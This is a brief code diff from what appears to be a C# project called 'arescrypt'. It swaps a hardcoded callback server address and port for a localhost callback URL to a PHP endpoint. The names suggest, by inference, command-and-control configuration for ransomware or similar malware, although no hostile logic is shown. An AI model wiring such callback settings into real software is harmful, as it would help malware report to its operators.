@@ -25,11 +25,8 @@
 
         // DAT file configuration
         public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
-        // Variables to be set by GetDATFileData()
         // Server Data
-        public static string callbackServer = "172.16.1.34";
-        public static int callbackPort = 0x2328; // 9000
-        public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
+        public static string callbackURL = "http://" + "localhost" + "/arescrypt.php"; // just put the callback url hosting the addon API script
     }
 
     class UserData
